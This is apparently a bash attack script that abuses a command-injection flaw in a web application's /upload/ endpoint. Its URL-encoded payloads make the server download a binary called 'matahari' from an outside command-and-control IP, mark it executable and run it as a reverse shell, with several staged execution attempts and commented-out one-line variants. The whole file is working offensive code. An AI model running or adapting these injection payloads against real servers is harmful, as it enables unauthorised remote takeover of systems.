#!/bin/bash

# Loading config
# echo "Loading configs/$1"
# source configs/$1

APP_URL="https://supplypro.saitzburg.at"
APP_CC="240.77.187.160"

echo "Downloading reverse shell ..."
curl -k "$APP_URL:5000/upload/none%3B%20wget%20-O%20matahari%20$APP_CC%3B%20chmod%20%2Bx%20matahari%3B%20%23"

sleep 2s

# Failing attempts to execute reverse shell
echo "Try executing shell ... should fail (1)"
curl -k "$APP_URL:5000/upload/none%3B%20matahari%3B%20%23"

sleep 5s

echo "Try executing shell ... should fail (2)"
curl -k "$APP_URL:5000/upload/none%3B%20./matahari%3B%20%23"

sleep 8s

echo "Try executing shell ... should fail (3)"
curl -k "$APP_URL:5000/upload/none%3B%20/var/www/html/matahari%3B%20%23"

sleep 17s

echo "Execute reverse shell ..."
curl -k "$APP_URL:5000/upload/none%3B%20export%20PATH%3D%24%28pwd%29%3A%24PATH%3B%20matahari%3B%20%23" &


# curl -k "https://$APP_URL:5000/upload/none%3B%20wget%20-O%20matahari%20$APP_CC%3B%20export%20PATH%3D%24%28pwd%29%3A%24PATH%3B%20chmod%20%2Bx%20matahari%3B%20matahari%3B%20%23"
# curl -k "https://localhost:5000/upload/none%3B%20wget%20-O%20matahari%20240.77.187.160%3B%20export%20PATH%3D%24%28pwd%29%3A%24PATH%3B%20chmod%20%2Bx%20matahari%3B%20matahari%3B%20%23"